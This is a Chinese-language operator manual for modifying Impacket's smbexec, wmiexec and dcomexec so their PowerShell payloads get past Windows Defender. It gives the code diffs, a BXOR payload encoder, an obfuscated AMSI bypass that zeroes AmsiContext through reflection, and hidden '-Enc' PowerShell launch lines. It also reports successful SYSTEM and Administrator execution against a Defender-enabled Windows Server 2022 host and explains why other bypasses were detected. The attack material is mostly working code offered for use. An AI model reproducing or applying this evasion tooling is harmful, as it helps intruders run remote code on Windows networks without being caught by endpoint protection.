# Impacket 绕过技术手册

> v1.2 | 2026-05-16 | 三点改造：BXOR 编码 → AMSI 混淆绕过 → `-Enc` 统一传输
> 验证：Win2022 + Defender 开启，三工具 cmd/PS 全通

## 速览

三工具 PS 模式改造 = 加新模块 `evasive_encoder.py` + 每个工具改 ~8 行：

```python
# 每个 execute_remote 的 PS 分支只需这三行：
encoder = EvasivePayloadEncoder()
encoded_cmd, _ = encoder.encode(data)                                           # BXOR 编码
encoded_cmd = EvasivePayloadEncoder.get_amsi_bypass_obfuscated() + ';' + encoded_cmd  # 混淆 AMSI bypass
data = f'powershell -NoP -NonI -W Hidden -Exec Bypass -Enc {base64(utf16le(encoded_cmd))}'  # -Enc 传输
```

## 文件地图

```
impacket-0.11.0/
├── impacket/examples/evasive_encoder.py  ← 新增：BXOR + AMSI bypass
├── examples/
│   ├── smbexec.py          ← 改 L287-293（PS 分支）
│   ├── wmiexec.py          ← 改 L289-297（PS 分支）
│   ├── dcomexec.py         ← 改 L271(_pwsh) + L438-447 + L515-524（PS 双类）
│   ├── psexec.py           ← 不可改（管道名固定）
│   └── services.py         ← 不可改
└── impacket-0.11.0_backup/ ← 原始备份
```

## evasive_encoder.py 方法

| 方法 | 作用 |
|------|------|
| `encode(ps)` | BXOR 加密 → Base64 → 随机 key 内联解码器 |
| `get_amsi_bypass()` | v1 反射版 AMSI bypass（~200 char，未混淆） |
| `get_amsi_bypass_obfuscated()` | **v3 混淆版（1093 char，推荐）** |
| `get_amsi_etw_bypass()` | Add-Type 合并 AMSI+ETW patch |

## AMSI Bypass 版本

| 版本 | 手法 | Win2022 | 大小 | 适用 |
|------|------|:---:|------|------|
| v1 | 反射 `*iUtils` 通配 + Marshal::Copy 清 AmsiContext | ✅ | ~200 | 轻量场景 |
| v2 | `amsiInitFailed=$true` | ❌ | ~50 | 废弃 |
| **v3** | **char 算术全部混淆 + Marshal::Copy 清 Context** | **✅** | **1093** | **推荐** |

**v3 核心逻辑（3 步）：**
```powershell
# 1. 反射找 AmsiUtils — 通配符 *iUtils 避开字面量
$a=[Ref].Assembly.GetTypes()
foreach($t in $a){if($t.Name -like '*'+[char](105)+...+')'){$c=$t}}
# 2. 取 AmsiContext 字段 — 全部 char 算术构造
$f=$c.GetFields('NonPublic,Static')  # 也是 char 算术
foreach($x in $f){if($x.Name -like '*'+[char](67)+...+')'){$ctx=$x}}
# 3. 清零
[System.Runtime.InteropServices.Marshal]::Copy(@(0),0,$ctx.GetValue($null),1)
```

**为什么不用 VirtualProtect：** `services.exe→PS→VirtualProtect(amsi.dll)` 被 Defender 行为引擎拦截（第二次触发）。`NtProtectVirtualMemory` 同样被拦。`Marshal::Copy` 清 Context 不走 DLL 内存属性修改，不触发行为检测。

## 各工具改造代码

### smbexec.py（L287-293）
```python
if shell_type == 'powershell':
    data = '$ProgressPreference="SilentlyContinue";' + data
    encoder = EvasivePayloadEncoder()
    encoded_cmd, _ = encoder.encode(data)
    amsi_bypass = EvasivePayloadEncoder.get_amsi_bypass_obfuscated()
    encoded_cmd = amsi_bypass + ';' + encoded_cmd
    import base64 as b64_enc
    b64_cmd = b64_enc.b64encode(encoded_cmd.encode('utf-16-le')).decode()
    data = 'powershell -NoP -NonI -W Hidden -Exec Bypass -Enc ' + b64_cmd
```

### wmiexec.py（L289-297）
```python
if shell_type == 'powershell':
    data = '$ProgressPreference="SilentlyContinue";' + data
    encoder = EvasivePayloadEncoder()
    encoded_cmd, _ = encoder.encode(data)
    amsi_bypass = EvasivePayloadEncoder.get_amsi_bypass_obfuscated()
    encoded_cmd = amsi_bypass + ';' + encoded_cmd
    import base64 as b64_enc
    b64_cmd = b64_enc.b64encode(encoded_cmd.encode('utf-16-le')).decode()
    data = self.__pwsh + b64_cmd   # __pwsh = 'powershell.exe -NoP -NoL -sta ... -Enc '
```

### dcomexec.py（3 处改动）

**L271 — 修复 name mangling：**
```python
# 改前：self.__pwsh = '...'  →  改后：self._pwsh = '...'
# 原因：__pwsh name mangling 导致子类 RemoteShellMMC20 访问 AttributeError
```

**L438-447 + L515-524 — 两个 execute_remote 的 PS 分支，同 wmiexec：**
```python
if shell_type == 'powershell':
    data = '$ProgressPreference="SilentlyContinue";' + data
    encoder = EvasivePayloadEncoder()
    encoded_cmd, _ = encoder.encode(data)
    amsi_bypass = EvasivePayloadEncoder.get_amsi_bypass_obfuscated()
    encoded_cmd = amsi_bypass + ';' + encoded_cmd
    import base64 as b64_enc
    b64_cmd = b64_enc.b64encode(encoded_cmd.encode('utf-16-le')).decode()
    data = self._pwsh + b64_cmd
```

## 测试结果

### Win2022 (192.168.179.135) — Defender 开启

| 工具 | cmd | PS | 权限 |
|------|:---:|:---:|------|
| smbexec | ✅ | ✅ | SYSTEM |
| wmiexec | ✅ | ✅ | Administrator |
| dcomexec | ✅ | ✅ | Administrator |

### Win2008 R2 (192.168.179.131) — 无 Defender

| 工具 | cmd | PS | 说明 |
|------|:---:|:---:|------|
| wmiexec | ✅ | ❌ | PS 2.0 不兼容 `[ScriptBlock]::Create()` |
| smbexec | ✅ | ❌ | 同上 |
| dcomexec | ✅ | ❌ | 同上 + ShellBrowserWindow 未注册 |

## 踩坑清单

| # | 坑 | 修复 |
|---|-----|------|
| 1 | `-Command '...'` 嵌套 payload 含单引号 → PS 语法错误 | 统一 `-Enc` + base64 |
| 2 | smbexec `echo ... > batch` 特殊字符 `\|>&%` 被 cmd 误解析 | `-Enc` 套壳（base64 无特殊字符） |
| 3 | dcomexec `self.__pwsh` → 子类 name mangling `AttributeError` | 改 `self._pwsh` |
| 4 | `pycryptodome` 需 `import Cryptodome; sys.modules['Crypto'] = Cryptodome` | 记入部署步骤 |
| 5 | 修改源码后 `pip install impacket` 不会自动重装 | 必须 `pip uninstall -y && pip install .` |
| 6 | PS 2.0 无 `[ScriptBlock]::Create()` → BXOR 不可用 | cmd 模式回退 |
| 7 | `amsiInitFailed=$true` 自身含 `"AmsiUtils"` 字面量被先扫 | 鸡生蛋，不可用 |
| 8 | VirtualProtect(amsi.dll) 第二次被 Defender 行为拦截 | 改用 Marshal::Copy 清 Context |
| 9 | 去注释压一行 → `(;` `,;` 破坏 PS 多行函数调用语法 | 保留多行结构 |
| 10 | `-Enc` 模式下 `'→''` 转义多余，破坏 PS 语法 | 去掉转义 |

## 不可改造项

| 项 | 原因 |
|----|------|
| `\pipe\svcctl` 管道名 | SCM RPC 固定端点，改则 RPC bind 失败 |
| RemComSvc.exe 替换 | 需重编译 C++，性价比低 |
| DCOM CLSID 完全隐藏 | 只有 ShellWindows/ShellBrowserWindow/MMC20 可选，可随机不可隐藏 |

---

> **改造 = 一个新增文件 + 每工具 ~8 行 + 3 个坑。** 核心思路：把 Impacket 的常量变成变量。
